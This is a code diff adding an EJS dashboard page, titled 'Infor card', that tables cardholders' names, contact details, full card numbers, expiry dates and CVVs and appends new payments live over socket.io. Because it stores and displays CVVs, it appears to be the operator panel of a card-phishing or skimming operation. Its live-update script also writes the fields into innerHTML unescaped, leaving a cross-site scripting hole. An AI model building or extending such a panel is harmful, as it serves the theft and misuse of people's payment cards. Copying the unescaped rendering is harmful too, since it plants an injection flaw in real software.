@@ -1,0 +1,137 @@
+<style>
+  .pagination {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin: 20px 0;
+    /* Khoảng cách giữa các phần tử */
+  }
+
+  .pagination-link {
+    padding: 10px 15px;
+    margin: 0 5px;
+    /* Khoảng cách giữa các ô */
+    border: 1px solid #007bff;
+    /* Đường viền */
+    border-radius: 5px;
+    /* Bo góc */
+    color: #007bff;
+    /* Màu chữ */
+    text-decoration: none;
+    /* Bỏ gạch chân */
+    transition: background-color 0.3s;
+    /* Hiệu ứng chuyển màu nền */
+  }
+
+  .pagination-link:hover {
+    background-color: #007bff;
+    /* Màu nền khi hover */
+    color: #fff;
+    /* Màu chữ khi hover */
+  }
+
+  .pagination-link.active {
+    background-color: #007bff;
+    /* Màu nền của trang hiện tại */
+    color: #fff;
+    /* Màu chữ của trang hiện tại */
+    border: 1px solid #007bff;
+    /* Đường viền của trang hiện tại */
+  }
+</style>
+<h3 class="page-title">Infor card</h3>
+<!-- Nội dung dashboard -->
+<div class="table-responsive">
+  <table class="table" id="payment-table">
+    <thead>
+      <tr>
+        <th>ID</th>
+        <th>Cardholder Name</th>
+        <th>Email</th>
+        <th>Address</th>
+        <th>Zip Code</th>
+        <th>Phone</th>
+        <th>Card Number</th>
+        <th>Expiry</th>
+        <th>CVV</th>
+      </tr>
+    </thead>
+    <tbody>
+      <% payments.forEach(payment=> { %>
+        <tr data-id="<%= payment.id %>">
+          <td>
+            <%= payment.id %>
+          </td>
+          <td>
+            <%= payment.cardholderName %>
+          </td>
+          <td>
+            <%= payment.email %>
+          </td>
+          <td>
+            <%= payment.address %>
+          </td>
+          <td>
+            <%= payment.zipCode %>
+          </td>
+          <td>
+            <%= payment.phone %>
+          </td>
+          <td>
+            <%= payment.cardNumber %>
+          </td>
+          <td>
+            <%= payment.expiry %>
+          </td>
+          <td>
+            <%= payment.cvv %>
+          </td>
+        </tr>
+        <% }) %>
+    </tbody>
+  </table>
+</div>
+
+<div class="pagination">
+  <% if (currentPage> 1) { %>
+    <a href="?page=<%= currentPage - 1 %>&limit=<%= limit %>" class="pagination-link">Previous</a>
+    <% } %>
+
+      <% for (let i=1; i <=totalPages; i++) { %>
+        <a href="?page=<%= i %>&limit=<%= limit %>" class="pagination-link <%= currentPage === i ? 'active' : '' %>">
+          <%= i %>
+        </a>
+        <% } %>
+
+          <% if (currentPage < totalPages) { %>
+            <a href="?page=<%= currentPage + 1 %>&limit=<%= limit %>" class="pagination-link">Next</a>
+            <% } %>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+  const socket = io();
+
+  socket.on('newPayment', (payment) => {
+    console.log('New payment received:', payment);
+
+    // Tạo một hàng mới cho bảng
+    const tableBody = document.querySelector('#payment-table tbody');
+    const newRow = document.createElement('tr');
+    newRow.setAttribute('data-id', payment.id);
+    newRow.innerHTML = `
+            <td>${payment.id}</td>
+            <td>${payment.cardholderName}</td>
+            <td>${payment.email}</td>
+            <td>${payment.address}</td>
+            <td>${payment.zipCode}</td>
+            <td>${payment.phone}</td>
+            <td>${payment.cardNumber}</td>
+            <td>${payment.expiry}</td>
+            <td>${payment.cvv}</td>
+        `;
+
+    // Thêm hàng mới vào bảng
+    tableBody.appendChild(newRow);
+  });
+</script>
